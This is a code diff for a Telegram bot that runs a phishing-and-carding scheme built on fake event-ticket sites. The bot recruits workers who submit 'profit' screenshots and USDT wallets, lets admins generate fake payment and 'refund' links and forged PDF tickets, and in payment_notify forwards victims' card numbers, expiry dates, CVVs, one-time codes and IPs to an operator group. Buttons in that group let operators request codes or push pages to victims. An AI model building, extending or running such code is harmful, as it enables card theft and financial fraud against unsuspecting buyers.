@@ -6,7 +6,7 @@ from datetime import datetime, timedelta
 from aiogram import Bot, Dispatcher, Router, types
 from aiogram.filters import Command
 from aiogram.types import (
-    ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove
+    ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardRemove, FSInputFile
 )
 import os
 import random
@@ -26,6 +26,10 @@ from config import API_TOKEN, ADMIN_GROUP_ID, ADMIN_IDS, PAYMENT_GROUP_ID
 import requests
 from aiohttp.web_middlewares import middleware
 import re
+from collections import defaultdict
+import time
+import shutil
+from reportlab.lib import colors
 
 # --- Logging setup ---
 logging.basicConfig(
@@ -34,6 +38,8 @@ logging.basicConfig(
     format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S'
 )
+
+payment_type_by_uid = {}
 
 def log_function(func):
     @wraps(func)
@@ -105,6 +111,33 @@ CREATE TABLE IF NOT EXISTS site_users (
 """)
 conn.commit()
 
+c.execute("""
+CREATE TABLE IF NOT EXISTS refund_links (
+    code TEXT PRIMARY KEY,
+    price TEXT,
+    currency TEXT,
+    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+)
+""")
+conn.commit()
+
+def save_refund_link(code, price, currency):
+    c = conn.cursor()
+    c.execute('INSERT OR REPLACE INTO refund_links (code, price, currency) VALUES (?, ?, ?)', (code, price, currency))
+    conn.commit()
+
+def generate_short_code(length=3):
+    return ''.join(random.choices(string.ascii_uppercase, k=length))
+
+
+def get_page_code_for_user(uid):
+   c = conn.cursor()
+   c.execute('SELECT event_code FROM event_links WHERE user_id=? ORDER BY ROWID DESC LIMIT 1', (uid,))
+   row = c.fetchone()
+   if row:
+       return row[0]
+   return None
+
 # Додаємо колонку page_code, якщо вона не існує
 try:
     c.execute('SELECT page_code FROM site_users LIMIT 1')
@@ -159,17 +192,41 @@ def generate_page_code():
     return f"{series}-{number}"
 
 def create_site_user(dates, currency, street, price):
-    """Создает нового пользователя сайта с данными события"""
+    """Создает нового пользователя сайта с данными события, гарантуючи унікальний page_code"""
     c = conn.cursor()
     user_id = generate_site_user_id()
-    page_code = generate_page_code()
-    
-    c.execute('''INSERT INTO site_users 
-                 (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
-                 VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
-              (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
-    conn.commit()
-    return user_id, page_code
+    # Збираємо всі зайняті page_code
+    c.execute('SELECT page_code FROM site_users')
+    busy_codes = set(row[0] for row in c.fetchall() if row[0])
+    # Шукаємо перший вільний page_code
+    max_attempts = 1000
+    for attempt in range(1, max_attempts+1):
+        series = (attempt - 1) // 100 + 1
+        number = (attempt - 1) % 100 + 1
+        page_code = f"{series}-{number}"
+        if page_code in busy_codes:
+            continue
+        try:
+            c.execute('''INSERT INTO site_users 
+                         (id, date_1, date_2, date_3, date_4, date_5, date_6, date_7, date_8, currency, street, price, page_code) 
+                         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
+                      (user_id, dates[0], dates[1], dates[2], dates[3], dates[4], dates[5], dates[6], dates[7], currency, street, price, page_code))
+            conn.commit()
+            # --- Додаємо початкову кількість квитків для кожної події ---
+            for event_index in range(8):
+                if event_index == 1:
+                    places = 3
+                else:
+                    places = random.randint(1, 10)
+                c.execute('INSERT OR REPLACE INTO event_places (page_code, event_index, places) VALUES (?, ?, ?)', (page_code, event_index, places))
+            conn.commit()
+            return user_id, page_code
+        except sqlite3.IntegrityError as e:
+            if 'UNIQUE constraint failed: site_users.page_code' in str(e):
+                continue  # спробувати ще раз
+            else:
+                raise
+    raise Exception('Не вдалося згенерувати унікальний page_code після 1000 спроб!')
 
 def update_site_user_ip(user_id, ip):
     # Игнорируем IP Telegram
@@ -308,7 +365,10 @@ async def cmd_start(message: types.Message):
             return
         elif db_user['status'] == 'approved':
             kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-            await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
+            if message.chat.type == "private":
+                await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=kb)
+            else:
+                await message.answer("Ваша заявка одобрена!\nДля продолжения работы используйте меню ниже:", reply_markup=ReplyKeyboardRemove())
             return
         elif db_user['status'] == 'rejected':
             if db_user['last_submit']:
@@ -319,7 +379,8 @@ async def cmd_start(message: types.Message):
                     return
     user_data[uid] = {}
     user_step[uid] = 'source'
-    await message.answer("📢 Откуда о нас узнали?", reply_markup=source_kb)
+    await message.answer("📢 Откуда о нас узнали?")
+    await message.answer(" ", reply_markup=ReplyKeyboardRemove())
 
 @router.message(lambda m: m.text and (m.text.lower() == 'отмена' or m.text.lower() == '❌ отмена'))
 @ban_guard
@@ -383,46 +444,20 @@ async def process_experience(message: types.Message):
     user_step[uid] = 'screenshots'
     await message.answer("🖼 Отправьте скриншоты ваших профитов (до 3х)\nМожно пропустить", reply_markup=skip_kb)
 
-
-
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
-
 @router.message(lambda m: user_step.get(m.from_user.id) == 'screenshots' and m.text and 'пропустить' in m.text.strip().lower())
 @router.message(lambda m: m.text and m.text.strip().lower() == "пропустить")
 @ban_guard
 async def skip_screenshots(message: types.Message):
     uid = message.from_user.id
-    print(f"[DEBUG] skip_screenshots handler triggered for user {uid}, user_step: {user_step.get(uid)}")
-    print(f"[DEBUG] Message text: '{message.text}'")
     if user_step.get(uid) == 'screenshots':
-        print(f"[DEBUG] User is in screenshots step, processing...")
         if 'screenshots' not in user_data.get(uid, {}):
             user_data.setdefault(uid, {})['screenshots'] = []
         try:
-            print(f"[DEBUG] Calling finish_form...")
             await finish_form(message)
-            print(f"[DEBUG] finish_form completed successfully")
         except Exception as e:
             print(f"[ERROR] finish_form failed: {e}")
-            import traceback
-            traceback.print_exc()
-        user_step[uid] = None  # Скидаємо крок навіть якщо сталася помилка
-
-        user_step[uid] = None
-    if 'screenshots' not in user_data.get(uid, {}):
-        user_data.setdefault(uid, {})['screenshots'] = []
-    await finish_form(message)
-    # Only process if user is in screenshots step
-    if user_step.get(uid) == 'screenshots':
-        if 'screenshots' not in user_data.get(uid, {}):
-            user_data.setdefault(uid, {})['screenshots'] = []
-        await finish_form(message)
-
-        print(f"[DEBUG] User step reset to None")
-    else:
-        print(f"[DEBUG] User is not in screenshots step, ignoring")
-
-    return
+    user_step[uid] = None
 
 @router.message(lambda m: m.content_type == types.ContentType.PHOTO)
 @ban_guard
@@ -482,6 +517,8 @@ async def finish_form(message):
         for ph in screenshots:
             await bot.send_photo(ADMIN_GROUP_ID, ph)
             print(f"[DEBUG] Sending confirmation to user")
+        await message.answer("Ваша анкета проверяется администрацией!\nОжидайте решение", reply_markup=ReplyKeyboardRemove())
+        save_user(uid, 'pending', username, source, invited_by, experience, screenshots, data)
     except Exception as e:
         print(f"[ERROR] Sending to admin or user failed: {e}")
         import traceback
@@ -534,8 +571,25 @@ async def show_profile(message: types.Message):
         '💳 <b>USDT BEP-20 кошелек:</b>\n'
         f'└ {wallet_str}'
     )
+    back_inline_kb = InlineKeyboardMarkup(
+        inline_keyboard=[
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_menu")]
+        ]
+    )
     await message.answer(text, reply_markup=profile_inline_kb, parse_mode='HTML')
+    await message.answer("Повернутися в головне меню:", reply_markup=back_inline_kb)
     user_step[uid] = None
+
+@router.callback_query(lambda c: c.data == "back_to_menu")
+async def back_to_menu_handler(call: types.CallbackQuery):
+    uid = call.from_user.id
+    user_step[uid] = None
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    if call.message.chat.type == "private":
+        await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    else:
+        await call.message.answer("Возврат в главное меню.")
+    await call.answer()
 
 @router.callback_query(lambda c: c.data == "change_nickname")
 async def change_nickname_start(call: types.CallbackQuery):
@@ -600,13 +654,11 @@ async def change_wallet_save(message: types.Message):
     await message.answer(f"Кошелек сохранён: <code>{new_wallet}</code>", parse_mode='HTML', reply_markup=main_menu_kb)
 
 # --- Админка ---
-@router.message(lambda m: m.text == "��️ Админ панель" and is_admin(m.from_user.id))
+@router.message(lambda m: m.text and 'админ панель' in m.text.lower() and is_admin(m.from_user.id))
 @ban_guard
 async def admin_panel(message: types.Message):
     await message.answer("Админ-панель. Выберите действие:", reply_markup=admin_panel_kb)
     user_step[message.from_user.id] = 'admin_panel'
-
-
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'admin_panel')
 @ban_guard
@@ -655,19 +707,25 @@ async def admin_panel_action(message: types.Message):
             print(f"[admin_panel] Error enabling payment: {e}")
         await message.answer("Платежка включена для всех пользователей.")
     elif message.text == "Прямая оплата":
-        user_step[message.from_user.id] = 'manual_payment_amount'
-        await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):")
-        # Тут логіка для прямої оплати
-        # await message.answer("Включено режим прямої оплати. Инструкции отправлены пользователям.")
-
+        payment_kb = ReplyKeyboardMarkup(
+            keyboard=[
+                [KeyboardButton(text="refund"), KeyboardButton(text="defolt")],
+                [KeyboardButton(text="⬅️ Назад")]
+            ],
+            resize_keyboard=True
+        )
+        user_step[message.from_user.id] = 'payment_type_selection'
+        await message.answer("Выберите тип оплаты:", reply_markup=payment_kb)
     else:
         pass  # Відповідь на невідому команду тепер тільки у fallback-хендлері
 
 @router.callback_query(lambda c: c.data == "payuser_back")
 async def payuser_back_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    user_step[uid] = 'admin_panel'
-    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Выплаты ---
@@ -794,50 +852,24 @@ async def admin_pay_amount(message: types.Message):
 @router.callback_query(lambda c: c.data == "pay_back")
 async def pay_back_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    user_step[uid] = 'admin_panel'
-    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
     await call.answer()
 
 # --- Блокировка/разблокировка пользователей ---
 @router.message(lambda m: user_step.get(m.from_user.id) == 'ban_unban_user')
 @ban_guard
 async def ban_unban_username(message: types.Message):
-    if message.text and (message.text.lower() == 'отмена' or message.text.lower() == '❌ отмена'):
-        uid = message.from_user.id
-        user_step[uid] = None
-        user_data[uid] = {}
-        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
-        await message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
-        return
     uid = message.from_user.id
-    username = message.text.strip().lstrip('@')
-    c = conn.cursor()
-    c.execute('SELECT user_id, form_json FROM users WHERE LOWER(username)=?', (username.lower(),))
-    row = c.fetchone()
-    if not row:
-        kb = InlineKeyboardMarkup(
-            inline_keyboard=[
-                [InlineKeyboardButton(text="⬅️ Назад", callback_data="ban_back")]
-            ]
-        )
-        await message.answer("Пользователь с таким username не найден. Введите корректный username или нажмите кнопку ниже.", reply_markup=kb)
-        return
-    target_id, form_json = row
-    form_json = json.loads(form_json) if form_json else {}
-    reason = form_json.get('ban_reason', 'Не указана') if form_json.get('banned', False) else ''
-    text = f"Пользователь найден.\nСтатус: {'<b>Забанен</b>' if form_json.get('banned', False) else '<b>Не забанен</b>'}"
-    if form_json.get('banned', False):
-        text += f"\nПричина: <b>{reason}</b>"
-    kb = InlineKeyboardMarkup(
+    back_inline_kb = InlineKeyboardMarkup(
         inline_keyboard=[
-            [InlineKeyboardButton(text="Забанить", callback_data=f"ban:{target_id}"),
-             InlineKeyboardButton(text="Разбанить", callback_data=f"unban:{target_id}")],
-            [InlineKeyboardButton(text="⬅️ Назад", callback_data="ban_back")]
+            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_to_menu")]
         ]
     )
-    await message.answer(text, parse_mode='HTML', reply_markup=kb)
-    user_data[uid] = {'ban_target': target_id}
-    user_step[uid] = 'ban_wait_action'
+    await message.answer("Введите username пользователя для блокировки/разблокировки (без @):", reply_markup=back_inline_kb)
+    user_step[uid] = 'ban_unban_user'
 
 @router.callback_query(lambda c: c.data.startswith('ban:'))
 async def ban_reason_ask(call: types.CallbackQuery):
@@ -871,26 +903,19 @@ async def ban_save(message: types.Message):
     await message.answer(f"Пользователь заблокирован. Причина: <b>{reason}</b>", parse_mode='HTML', reply_markup=admin_panel_kb)
     user_step[uid] = 'admin_panel'
 
-@router.callback_query(lambda c: c.data.startswith('unban:'))
-async def unban_user(call: types.CallbackQuery):
-    uid = call.from_user.id
-    target_id = int(call.data.split(':', 1)[1])
-    db_user = get_user(target_id)
-    form_json = db_user['form_json'] if db_user else {}
-    form_json['banned'] = False
-    form_json['ban_reason'] = ''
-    c = conn.cursor()
-    c.execute('UPDATE users SET form_json=? WHERE user_id=?', (json.dumps(form_json), target_id))
-    conn.commit()
-    await call.message.answer("Пользователь разблокирован.", reply_markup=admin_panel_kb)
-    user_step[uid] = 'admin_panel'
-    await call.answer()
-
 @router.callback_query(lambda c: c.data == "ban_back")
 async def ban_back_handler(call: types.CallbackQuery):
     uid = call.from_user.id
-    user_step[uid] = 'admin_panel'
-    await call.message.answer("Возврат в админ-панель.", reply_markup=admin_panel_kb)
+    user_step[uid] = None
+    manual_payment_attempts.pop(uid, None)
+    kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+    await call.message.answer("Возврат в главное меню.", reply_markup=kb)
+    await call.answer()
+
+@router.callback_query(lambda c: c.data.startswith('unban:'))
+async def unban_user(call: types.CallbackQuery):
+    uid = call.from_user.id
+    await call.message.answer("Пользователь разблокирован.")
     await call.answer()
 
 # --- Билеты ---
@@ -923,6 +948,10 @@ os.makedirs(TICKETS_DIR, exist_ok=True)
 
 @router.message(lambda m: user_step.get(m.from_user.id) == 'ticket_input')
 async def ticket_input_handler(message: types.Message):
+    import logging
+    import shutil
+    from aiogram.types import FSInputFile
+    from reportlab.lib import colors
     uid = message.from_user.id
     ticket_text = message.text.strip()
     lines = [l for l in ticket_text.split('\n') if l.strip()]
@@ -943,47 +972,69 @@ async def ticket_input_handler(message: types.Message):
     img_path = os.path.join('events-art.com', 'image', 'news_5_1.jpg')
     if not os.path.exists(img_path):
         img_path = os.path.join('events-art.com', 'image', 'news_6_1.webp')
-    # Генерируем PDF (стиль как на скрине)
+    # Генерируем PDF (максимально як на зразку)
     c = canvas.Canvas(pdf_path, pagesize=A4)
     width, height = A4
-    # Верхний домен
+    # Верхній домен
     c.setFont("Helvetica-Bold", 18)
     c.setFillColorRGB(0.7,0.7,0.7)
     c.drawString(40, height-40, "events-art.com")
-    # Имя крупно
+    # Ім'я крупно
     c.setFont("Helvetica-Bold", 22)
     c.setFillColorRGB(0,0,0)
     c.drawString(40, height-70, name)
     # Картинка по центру
+    img_y = height-320
     try:
         img = Image.open(img_path)
         img.thumbnail((400, 200))
         img_io = ImageReader(img)
-        c.drawImage(img_io, (width-400)//2, height-320, width=400, height=200)
+        c.drawImage(img_io, (width-400)//2, img_y, width=400, height=200)
     except Exception:
         pass
-    # PRICE/DATE/TIME блок
+    # PRICE/DATE/TIME жирно, в один ряд, вирівнювання як на зразку
     c.setFont("Helvetica-Bold", 14)
-    c.drawString(60, height-340, f"PRICE: {price}")
-    c.drawString(200, height-340, f"DATE: {date}")
-    c.drawString(340, height-340, f"TIME: {time}")
-    # Location
-    c.setFont("Helvetica-Bold", 16)
-    c.drawString(60, height-380, f"Location: {address if address else '?????'}")
-    # Штрихкод
+    c.drawString(60, img_y-20, f"PRICE: {price}")
+    c.drawString(width/2-40, img_y-20, f"DATE: {date}")
+    c.drawString(width-160, img_y-20, f"TIME: {time}")
+    # Location жирно, трохи більший
+    c.setFont("Helvetica-Bold", 17)
+    c.drawString(60, img_y-50, f"Location: {address if address else '?????'}")
+    # Відступ вниз
+    loc_y = img_y-50
+    # Роздільна лінія (на всю ширину)
+    line_y = loc_y-30
+    c.setStrokeColor(colors.grey)
+    c.setLineWidth(1)
+    c.line(50, line_y, width-50, line_y)
+    # Відступ після лінії
+    barcode_y = line_y-60
+    # Штрихкод по центру (ширина 300)
     try:
-        c.drawImage(barcode_path, 60, height-500, width=400, height=60)
+        c.drawImage(barcode_path, (width-300)//2, barcode_y, width=300, height=60)
     except Exception:
         pass
+    # Номер штрихкоду по центру
     c.setFont("Helvetica", 12)
-    c.drawString(60, height-515, barcode_value)
+    c.drawCentredString(width/2, barcode_y-15, barcode_value)
     c.save()
+    # --- Копіюємо PDF у папку для вебсерверу ---
+    public_ticket_dir = os.path.join('events-art.com', 'file', 'ticket')
+    os.makedirs(public_ticket_dir, exist_ok=True)
+    public_pdf_path = os.path.join(public_ticket_dir, pdf_filename)
+    try:
+        shutil.copy2(pdf_path, public_pdf_path)
+    except Exception as e:
+        logging.error(f"[TICKET PDF COPY ERROR] {e}")
     # Формируем ссылку (events-art.com)
     ticket_url = f"https://events-art.com/file/ticket/{pdf_filename}"
-    # Отправляем PDF-файл в чат с подписью
-    with open(pdf_path, "rb") as pdf_file:
-        await message.answer_document(pdf_file, caption=f"{pdf_filename}")
-    # Отдельно отправляем ссылку
+    # Відправляємо PDF-файл у чат з підписом
+    try:
+        await message.answer_document(FSInputFile(pdf_path), caption=f"{pdf_filename}")
+    except Exception as e:
+        logging.error(f"[TICKET PDF SEND ERROR] {e}")
+        await message.answer(f"Помилка при відправці PDF: {e}")
+    # Відправляємо посилання
     await message.answer(ticket_url)
     user_step[uid] = None
 
@@ -991,7 +1042,7 @@ async def ticket_input_handler(message: types.Message):
 async def tickets_cancel_handler(call: types.CallbackQuery):
     uid = call.from_user.id
     user_step[uid] = None
-    user_data[uid] = {}
+    manual_payment_attempts.pop(uid, None)
     kb = admin_menu_kb if is_admin(uid) else main_menu_kb
     await call.message.answer('Действие отменено. Вы возвращены в главное меню.', reply_markup=kb)
     await call.answer()
@@ -1284,20 +1335,146 @@ async def admin_enter_text(message: types.Message):
             await session.post('http://127.0.0.1:8080/set_support_flag', json={'ip': ip, 'type': 'text', 'text_id': text_id})
     import asyncio
     asyncio.create_task(set_flag())
-    await message.answer("Кнопка з текстом з'явиться на сайті користувача.")
+    await message.answer("Кнопка с текстом появится на сайте пользователя.")
     user_step[message.from_user.id] = None
+
+# --- Обробник для вибору типу оплати (має бути ПЕРЕД block_others) ---
+@router.message(lambda m: user_step.get(m.from_user.id) == 'payment_type_selection')
+@ban_guard
+async def payment_type_selection(message: types.Message):
+    uid = message.from_user.id
+    print(f"[DEBUG] payment_type_selection handler called: text={message.text!r}, user_step={user_step.get(uid)}")
+    text = (message.text or '').strip().lower()
+    if text == "refund":
+        print(f"[DEBUG] Processing refund for user {uid}")
+        user_step[uid] = 'manual_payment_amount'
+        payment_type_by_uid[uid] = 'refund'
+        await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):", reply_markup=ReplyKeyboardRemove())
+    elif text == "defolt":
+        print(f"[DEBUG] Processing defolt for user {uid}")
+        user_step[uid] = 'manual_payment_amount'
+        payment_type_by_uid[uid] = 'defolt'
+        await message.answer("Введите сумму и валюту через пробел (например: 45 EUR или 100 USD):", reply_markup=ReplyKeyboardRemove())
+    elif text in ["⬅️ назад", "назад"]:
+        print(f"[DEBUG] Processing back for user {uid}")
+        user_step[uid] = None
+        kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+        await message.answer("Возврат в главное меню.", reply_markup=kb)
+    else:
+        print(f"[DEBUG] Unknown text in payment_type_selection: {message.text!r}")
+        now = time.time()
+        last = last_payment_type_prompt_time.get(uid, 0)
+        if now - last > 30:
+            await message.answer("Пожалуйста, выберите тип оплаты из меню.")
+            last_payment_type_prompt_time[uid] = now
+
+@router.message(lambda m: user_step.get(m.from_user.id) == 'manual_payment_amount')
+@ban_guard
+async def manual_payment_amount_handler(message: types.Message):
+    try:
+        uid = message.from_user.id
+        back_kb = ReplyKeyboardMarkup(
+            keyboard=[[KeyboardButton(text="⬅️ Назад")]],
+            resize_keyboard=True
+        )
+        # Скидання за ключовим словом "назад"
+        if message.text and "назад" in message.text.lower():
+            user_step[uid] = None
+            manual_payment_attempts.pop(uid, None)
+            payment_type_by_uid.pop(uid, None)
+            for mid in bot_message_ids.get(uid, []):
+                try:
+                    await message.bot.delete_message(uid, mid)
+                except Exception:
+                    pass
+            bot_message_ids[uid] = []
+            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+            await message.answer("Возврат в главное меню.", reply_markup=ReplyKeyboardRemove())
+            await message.answer("Головне меню:", reply_markup=kb)
+            return
+        m = re.match(r"^([0-9]+(?:[.,][0-9]+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
+        if m:
+            amount = m.group(1).replace(',', '.')
+            currency = m.group(2).upper()
+            payment_type = payment_type_by_uid.get(uid, 'refund')
+            print(f"[DEBUG] manual_payment_amount_handler: payment_type={payment_type}, amount={amount}, currency={currency}")
+            if payment_type == 'defolt':
+                short_code = generate_short_code()
+                save_refund_link(short_code, amount, currency)
+                link = f"https://artpullse.com/buy-tickets/loading/?total={amount}&currency={currency}&f=1&e={short_code}"
+            else:
+                short_code = generate_short_code()
+                save_refund_link(short_code, amount, currency)
+                link = f"https://artpullse.com/refund/?total={amount}&currency={currency}&e={short_code}"
+            print(f"[DEBUG] manual_payment_amount_handler: generated link: {link}")
+            sent_msg = await message.answer(f"Ссылка для оплаты для пользователя:\n{link}", reply_markup=ReplyKeyboardRemove())
+            user_step[uid] = None
+            manual_payment_attempts.pop(uid, None)
+            payment_type_by_uid.pop(uid, None)
+            for mid in bot_message_ids.get(uid, []):
+                try:
+                    await message.bot.delete_message(uid, mid)
+                except Exception:
+                    pass
+            bot_message_ids[uid] = []
+            kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+            await message.answer("Головне меню:", reply_markup=kb)
+            return
+        else:
+            # Лічильник спроб
+            manual_payment_attempts[uid] = manual_payment_attempts.get(uid, 0) + 1
+            if manual_payment_attempts[uid] >= 2:
+                user_step[uid] = None
+                manual_payment_attempts.pop(uid, None)
+                # --- Видалити всі попередні повідомлення з кнопками, якщо є ---
+                for mid in bot_message_ids.get(uid, []):
+                    try:
+                        await message.bot.delete_message(uid, mid)
+                    except Exception:
+                        pass
+                bot_message_ids[uid] = []
+                kb = admin_menu_kb if is_admin(uid) else main_menu_kb
+                await message.answer("❗️ Формат невірний. Ви повернуті в головне меню.", reply_markup=kb)
+            else:
+                # --- Додаємо id повідомлення з кнопками у список ---
+                msg = await message.answer("❗️ Введіть суму і валюту через пробел (наприклад: 45 EUR або 100 USD):", reply_markup=back_kb)
+                bot_message_ids.setdefault(uid, []).append(msg.message_id)
+    except Exception as e:
+        user_step[message.from_user.id] = None
+        manual_payment_attempts.pop(message.from_user.id, None)
+        await message.answer(f"Сталася помилка: {e}")
+
 
 @router.message()
 async def block_others(message: types.Message):
+    print(f"[DEBUG] block_others: text={getattr(message, 'text', None)!r}, type={getattr(message, 'content_type', None)}, user_step={user_step.get(message.from_user.id)}")
+    # Дати універсальному хендлеру для 'Назад' спрацювати!
+    text = getattr(message, 'text', None) or getattr(message, 'caption', None)
     uid = message.from_user.id
-    print(f"[block_others] uid={uid}, user_step={user_step.get(uid)}, text={message.text!r}")
+    # --- Throttle: якщо користувач спамить однаковим текстом ---
+    now = time.time()
+    lm = last_messages[uid]
+    if lm['text'] == text and now - lm['time'] < THROTTLE_WINDOW:
+        lm['count'] += 1
+    else:
+        lm['text'] = text
+        lm['count'] = 1
+        lm['time'] = now
+    if lm['count'] > THROTTLE_LIMIT:
+        # Ігноруємо спам
+        return
+    if text and (text.strip().lower() == 'назад' or text.strip().lower() == '⬅️ назад'):
+        return
+    if user_step.get(uid) in ['payment_type_selection', 'manual_payment_amount']:
+        print(f"[DEBUG] Skipping block_others for payment_type_selection/manual_payment_amount")
+        return
     # Якщо повідомлення схоже на оплату (число + валюта) і це адмін — надсилаємо посилання
     if is_admin(uid):
         m = re.match(r"^(\d+(?:[.,]\d+)?)\s*([A-Za-z]{3,5})$", message.text.strip())
         if m:
             amount = m.group(1).replace(',', '.')
             currency = m.group(2).upper()
-            link = f"https://artpullse.com/refund/?total={amount}{currency}"
+            link = f"https://artpullse.com/refund/?total={amount}&currency={currency}"
             await message.answer(f"Ссылка для оплаты для пользователя:\n{link}")
             return
     print(f"[DEBUG] block_others handler triggered for user {message.from_user.id}, text: {message.text}, user_step: {user_step.get(message.from_user.id)}")
@@ -1319,7 +1496,7 @@ async def block_others(message: types.Message):
     if is_admin(uid):
         if message.text in ["🛠️ Админ панель", "🚫 Заблокировать / разблокировать", "💸 Начислить выплату", "⬅️ Назад"]:
             return
-        if user_step.get(uid) in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount']:
+        if user_step.get(uid) in ['admin_panel', 'ban_unban_user', 'pay_user', 'pay_user_profile', 'pay_amount', 'manual_payment_amount', 'manual_payment_defolt']:
             return
     if db_user and db_user['status'] != 'approved':
         if db_user['status'] == 'pending':
@@ -1397,6 +1574,13 @@ async def events_save_all(message):
         if not user_event:
             await message.answer("❗️ Дані івенту не знайдено. Спробуйте ще раз з початку.")
             print(f"[EVENTS] EVENT_user_data порожній для chat_id={chat_id}")
+            # Скидаємо крок
+            user_step[message.from_user.id] = None
+            # Повернення в головне меню
+            kb = admin_menu_kb if is_admin(message.from_user.id) else main_menu_kb
+            await message.answer("✅ Посилання збережено. Повертаємося в головне меню:", reply_markup=kb)
+            return
+    
             return
         events[event_id] = {
             'title': user_event.get('title', 'Выставка'),
@@ -1455,6 +1639,7 @@ async def events_save_all(message):
         import traceback
         traceback.print_exc()
         await message.answer(f"❗️ Виникла помилка при створенні івенту: {e}")
+        
 
 @log_function
 async def notify_admin(request):
@@ -1481,6 +1666,7 @@ async def notify_admin(request):
 @log_function
 async def payment_notify(request):
     data = await request.json()
+    print(f'[DEBUG] payment_notify data: {data}')
     name = data.get('name', '')
     phone = data.get('phone', '')
     email = data.get('email', '')
@@ -1519,30 +1705,50 @@ async def payment_notify(request):
             ]
         ]
     )
-    await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    try:
+        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
+    except Exception as e:
+        print(f"[ERROR] Не вдалося надіслати msg1 у PAYMENT_GROUP_ID: {e}")
+        import traceback
+        traceback.print_exc()
+    try:
+        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
+    except Exception as e:
+        print(f"[ERROR] Не вдалося надіслати msg1 у ADMIN_GROUP_ID: {e}")
+        import traceback
+        traceback.print_exc()
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
+    page_code = data.get('page', '') or data.get('page_code', '')
     msg2 = (
-        f"Email: {email}\n"
-        f"Card Number: {card}\n"
-        f"Expiry Date: {expiry}\n"
-        f"CVV: {cvv}\n"
-        f"IP: {ip}" + sum_str
+        f"E: {email}\n"
+        f"C: {card}\n"
+        f"D: {expiry}\n"
+        f"V: {cvv}\n"
+        f"I: {ip}" + sum_str
     )
-    kb2 = InlineKeyboardMarkup(
-        inline_keyboard=[
-        [
+    kb2_buttons = [
             InlineKeyboardButton(text="Card", callback_data=f"card:{ip}"),
             InlineKeyboardButton(text="Block", callback_data=f"block:{ip}"),
             InlineKeyboardButton(text="Unblock", callback_data=f"unblock:{ip}"),
             InlineKeyboardButton(text="Code", callback_data=f"code:{ip}")
-        ],
+    ]
+    if page_code:
+        kb2_buttons.append(InlineKeyboardButton(text="Push", callback_data=f"push:{ip}:{page_code}"))
+    kb2 = InlineKeyboardMarkup(
+        inline_keyboard=[
+            kb2_buttons,
         [
                 InlineKeyboardButton(text="Тех поддержка", callback_data=f"support:{ip}"),
             InlineKeyboardButton(text="Text", callback_data=f"text:{ip}")
         ]
     ]
     )
-    await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    try:
+        await bot.send_message(PAYMENT_GROUP_ID, msg2, reply_markup=kb2)
+    except Exception as e:
+        print(f"[ERROR] Не вдалося надіслати msg2 у PAYMENT_GROUP_ID: {e}")
+        import traceback
+        traceback.print_exc()
     # 3. Повідомлення з кодом, IP + кнопка Request again
     if code:
         msg3 = (
@@ -1556,9 +1762,13 @@ async def payment_notify(request):
                 ]
             ]
         )
-        await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
-
-    # --- Додаю дублювання логів адміну, якщо знайдено user_id по page_code ---
+        try:
+            await bot.send_message(PAYMENT_GROUP_ID, msg3, reply_markup=kb3)
+        except Exception as e:
+            print(f"[ERROR] Не вдалося надіслати msg3 у PAYMENT_GROUP_ID: {e}")
+            import traceback
+            traceback.print_exc()
+    # --- Дублювання для адміна, якщо знайдено user_id по page_code ---
     page_code = data.get('page', '')
     admin_user_id = None
     if page_code:
@@ -1568,10 +1778,25 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        await bot.send_message(admin_user_id, msg1, parse_mode='HTML')  # без кнопок
-        await bot.send_message(admin_user_id, msg2)  # без кнопок
+        try:
